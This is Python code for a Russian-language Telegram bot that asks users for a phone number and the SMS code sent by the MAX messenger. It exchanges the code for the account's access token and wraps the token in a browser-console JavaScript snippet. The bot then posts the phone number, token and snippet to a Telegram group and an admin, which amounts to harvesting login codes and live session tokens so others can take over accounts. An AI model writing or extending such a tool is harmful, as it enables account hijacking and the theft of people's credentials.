def handle_phone(chat, uid, text):
    clean = re.sub(r'[\s\-\(\)]', '', text)
    m = re.match(r'^(\+?[78])?(\d{10})$', clean)
    
    if not m:
        bot.send(chat, "❌ Неверный формат! Пример: +79991234567")
        return
    
    phone = '7' + m.group(2)
    
    # Проверяем не зарегистрирован ли
    for r in db.data["regs"]:
        if r["phone"] == phone:
            bot.send(chat, f"⚠️ Номер {phone} уже зарегистрирован!")
            db.set_user(uid, {"state": "menu", "phone": "", "api": None, "tries": 0})
            return
    
    # Создаем API объект и отправляем SMS
    msg = bot.send(chat, f"📱 {phone}\n🔄 Отправляю запрос на SMS...")
    
    if not msg.get("ok"):
        return
    
    mid = msg["result"]["message_id"]
    
    try:
        api = MaxAPI()
        api.send_verify_code(phone)
        
        user = db.user(uid)
        user["state"] = "wait_code"
        user["phone"] = phone
        user["api"] = api
        user["tries"] = 0
        db.set_user(uid, user)
        
        bot.edit(chat, mid, f"✅ SMS отправлен на номер {phone}!\n\n📨 Введи код из SMS:")
    
    except Exception as e:
        error_msg = str(e)
        bot.edit(chat, mid, f"❌ Ошибка отправки SMS: {error_msg}")
        db.set_user(uid, {"state": "menu", "phone": "", "api": None, "tries": 0})

def handle_code(chat, uid, text, username, fullname):
    user = db.user(uid)
    code = re.sub(r'\s', '', text)
    
    if not code.isdigit() or len(code) < 4:
        bot.send(chat, "❌ Код должен быть из цифр!")
        return
    
    user["tries"] += 1
    if user["tries"] > 5:
        bot.send(chat, "❌ Много попыток! Начни заново")
        db.set_user(uid, {"state": "menu", "phone": "", "api": None, "tries": 0})
        return
    
    db.set_user(uid, user)
    
    msg = bot.send(chat, "🔄 Проверяю код...")
    
    if not msg.get("ok"):
        return
    
    mid = msg["result"]["message_id"]
    
    try:
        api = user["api"]
        result = api.check_verify_code(code)
        
        # Получаем токен и viewer_id
        token = result.access_token
        viewer_id = int(token.split('.')[1]) if '.' in token else random.randint(100000000, 999999999)
        
        # Создаем скрипт
        script = make_script(user["phone"], token, viewer_id)
        
        # Сохраняем
        db.add(user["phone"], token, viewer_id, script, uid, username or fullname)
        
        # Отправляем в группу
        group_msg = (
            f"🆕 *Новый аккаунт MAX!*\n\n"
            f"👤 {fullname}\n"
            f"📱 `{user['phone']}`\n"
            f"🆔 `{viewer_id}`\n\n"
            f"🔑 *Скрипт для консоли F12:*\n"
            f"```javascript\n{script}\n```\n\n"
            f"🕒 {datetime.now().strftime('%H:%M:%S')}"
        )
        
        try:
            bot.send(GROUP_ID, group_msg, parse="Markdown")
        except:
            pass
        
        try:
            bot.send(ADMIN_ID, group_msg, parse="Markdown")
        except:
            pass
        
        # Пользователю
        bot.edit(chat, mid,
            f"✅ *Готово!*\n\n"
            f"📱 `{user['phone']}`\n"
            f"🆔 `{viewer_id}`\n\n"
            f"📤 Скрипт отправлен в группу",
            parse="Markdown",
            kbd=menu_kbd(True))
        
        bot.send(chat,
            f"🔑 *Твой скрипт:*\n\n"
            f"```javascript\n{script}\n```\n\n"
            f"📋 Открой сайт MAX → F12 → Console → Вставь → Enter",
            parse="Markdown")
        
        db.set_user(uid, {"state": "menu", "phone": "", "api": None, "tries": 0})
    
    except Exception as e:
        error_msg = str(e)
        bot.edit(chat, mid, f"❌ {error_msg}\nПопыток: {user['tries']}/5")

